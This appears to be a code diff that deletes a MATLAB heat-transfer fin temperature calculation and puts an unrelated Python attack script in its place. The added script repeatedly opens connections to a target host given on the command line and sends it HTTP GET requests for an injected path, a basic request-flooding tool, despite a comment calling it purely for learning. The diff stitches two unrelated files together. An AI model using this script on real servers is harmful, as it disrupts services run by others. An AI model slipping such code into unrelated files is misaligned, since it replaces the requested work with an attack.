@@ -1,31 +1,22 @@
-# % Parameters
-L = 0.04;              % Length of the fin (meters)
-P = 0.404;             % Perimeter of the fin (meters)
-Ac = 0.0004;           % Cross-sectional area of the fin (square meters)
-Tb = 225;              % Base temperature (°C)
-T_inf = 25;            % Ambient temperature (°C)
-k = 45;                % Thermal conductivity (W/m·K)
-h = 15;                % Convective heat transfer coefficient (W/m^2·K)
-dx = 0.005;            % Grid spacing (0.5 cm = 0.005 m)
+# Please note that running this code might
+# cause your IP to be blocked by the server. The purpose
+# of this code is purely for learning purposes.
+import socket
+import sys
+import os
 
-% Calculate the number of grid points
-N = L / dx;
+print("][ Attacking " + sys.argv[1] + " ... ][")
+print("injecting " + sys.argv[2])
 
-% Initialize temperature distribution array
-T = zeros(N+1, 1);
+def attack():
+	#pid = os.fork()
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((sys.argv[1], 80))
+	print(">> GET /" + sys.argv[2] + " HTTP/1.1")
+	s.send(("GET /" + sys.argv[2] + " HTTP/1.1\r\n").encode())
+	s.send(("Host: " + sys.argv[1] + "\r\n\r\n").encode())
+	s.close()
 
-% Set boundary conditions
-T(1) = Tb;
-T(N+1) = Tb;
-
-% Iterate to solve for temperature distribution
-for i = 2:N
-    T(i) = T(i-1) + (h * P * dx / (k * Ac)) * (T_inf - T(i-1));
-end
-
-% Display the temperature distribution
-x = 0:dx:L;
-fprintf('Distance from base (m)\tTemperature (°C)\n');
-for i = 1:N+1
-    fprintf('%.4f\t%.3f\n', x(i), T(i));
-end
+# Driver code
+for i in range(1, 1000):
+	attack()
